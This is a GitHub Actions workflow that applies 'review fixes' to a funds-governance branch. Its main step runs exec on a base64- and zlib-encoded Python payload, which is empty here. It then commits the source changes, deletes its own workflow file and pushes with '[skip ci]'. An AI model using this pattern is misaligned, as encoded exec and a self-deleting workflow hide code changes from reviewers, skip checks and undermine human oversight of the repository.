name: Apply PR4 review fixes

on:
  push:
    branches:
      - feat/funds-governance-ux
    paths:
      - .github/workflows/apply-pr4-review-fixes.yml

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: feat/funds-governance-ux
          fetch-depth: 0

      - name: Apply guarded source fixes
        run: |
          python3 - <<'PY'
          import base64, zlib
          payload = ''
          exec(zlib.decompress(base64.b64decode(payload)))
          PY
          git diff --check
          git status --short

      - name: Commit fixes and remove temporary workflow
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git rm .github/workflows/apply-pr4-review-fixes.yml
          git add src/backend/group/lib.mo src/backend/main.mo src/frontend/src/routes/funds/+page.svelte 'src/frontend/src/routes/funds/[id]/+page.svelte' src/frontend/src/lib/components/Profile/GroupPanel.svelte
          git commit -m "fix: address PR4 governance and fund UX review issues [skip ci]"
          git push origin HEAD:feat/funds-governance-ux
